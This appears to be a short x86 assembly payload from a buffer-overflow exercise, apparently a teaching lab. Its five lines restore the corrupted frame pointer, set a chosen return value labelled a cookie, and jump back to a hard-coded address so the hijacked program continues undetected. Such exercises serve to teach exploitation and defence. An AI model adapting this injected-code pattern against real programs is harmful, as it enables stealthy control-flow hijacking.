lea 0x28(%esp),%edx /* calc ebp */
movl %edx,%ebp /* restore ebp */
movl $0x3e95539d,%eax /* return cookie */
push $0x08048c38 /* push return address */
ret
